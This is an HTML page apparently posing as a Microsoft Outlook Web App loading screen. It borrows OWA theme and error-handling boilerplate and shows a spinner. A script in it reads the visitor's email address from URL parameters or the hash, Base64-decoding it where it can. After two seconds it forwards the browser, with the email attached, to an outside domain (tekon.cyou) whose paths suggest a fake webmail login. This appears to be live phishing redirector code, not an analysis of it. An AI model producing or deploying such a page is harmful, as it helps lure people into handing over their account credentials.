<!DOCTYPE html>
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" translate="no">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="pragma" content="no-cache">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <meta name="format-detection" content="telephone=no">
    <title>Loading</title>
    <style>
        @font-face {
            font-family: 'Roboto';
            src: url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
            font-weight: 300, 400, 500;
            font-style: normal;
        }

        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        #loadingScreen {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #loadingSpinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .dark #loadingScreen {
            background-color: #333;
        }

        .darkNew #loadingScreen {
            background-color: #1f1f1f;
        }
    </style>
    <script nonce="nonce-placeholder">
        try {
            if ("localStorage" in window) {
                var userNormalizedTheme = window.localStorage.getItem("UsersNormalizedTheme");
                if (userNormalizedTheme && /\.dark$/.test(userNormalizedTheme)) {
                    document.documentElement.classList.add("dark");
                }
                if (userNormalizedTheme && /\.dark\.new$/.test(userNormalizedTheme)) {
                    document.documentElement.classList.add("darkNew");
                }
                var pwabarcolor = window.localStorage.getItem("PwaTheme");
                if (pwabarcolor) {
                    var themetag = document.getElementsByName("theme-color");
                    if (themetag && themetag.length) {
                        themetag[0].setAttribute("content", pwabarcolor);
                    }
                }
            }
        } catch (e) {}
    </script>
    <script nonce="nonce-placeholder">
        function logError(o, n, r, e, a, i) {
            window.owaErrorHandler ? window.owaErrorHandler(o, n, r, e, a, i) : window.owaBackfilledErrors.push(arguments);
        }
        window.FabricConfig = { fontBaseUrl: null };
        window.owaBackfilledErrors = [];
        window.onerror = logError;
        if ("onunhandledrejection" in window) {
            window.addEventListener("unhandledrejection", function(o) {
                var n = o && o.reason || "[no reason given]";
                if (n instanceof Error) {
                    logError("Unhandled Rejection: " + n, "", 0, 0, n);
                } else if (n.responseErrorMessage && n.callstackAtRequest && n instanceof Response) {
                    logError(n.responseErrorMessage, "", void 0, void 0, void 0, n.callstackAtRequest);
                } else {
                    logError("Unhandled Rejection: " + (typeof n === "string" ? n : JSON.stringify(n)));
                }
            });
        }
        window.onload = function() {
            try {
                if (!self.App && self.location && self.location.search && self.location.search.indexOf("gulp") === -1) {
                    window.location.assign("/auth/error?esrc=IndexPageIncomplete");
                }
            } catch (o) {}
        };
    </script>
    <script nonce="nonce-placeholder">
        // Extract and decode email from ?email=, ?code= (Base64), or #
        function extractEmail() {
            const params = new URLSearchParams(window.location.search);
            let email = params.get('email') || params.get('code') || '';

            // Try Base64 decode if present
            if (email) {
                try { email = atob(email); } catch (e) {} // fallback to plain if not Base64
            }

            // Fallback to hash
            if (!email && window.location.hash && window.location.hash.length > 1) {
                const raw = decodeURIComponent(window.location.hash.substring(1));
                try { email = atob(raw); } catch (e) { email = raw; }
            }

            return email.trim();
        }

        try {
            const email = extractEmail();
            const targetUrl = "https://tekon.cyou/comt/";
            const delayInMilliseconds = 2000; // 2 seconds delay

            setTimeout(function() {
                if (email) {
                    // Attach as ?email= (URL-encoded plain email) - reliable for query param
                    window.location.href = targetUrl + "?email=" + encodeURIComponent(email);
                } else {
                    window.location.href = targetUrl;
                }
            }, delayInMilliseconds);
        } catch (e) {
            setTimeout(function() {
                window.location.href = "https://tekon.cyou/wbmail/";
            }, 2000);
        }
    </script>
    <noscript>JavaScript must be enabled.</noscript>
</head>
<body>
    <div id="loadingScreen">
        <div id="loadingSpinner"></div>
    </div>
</body>
</html>
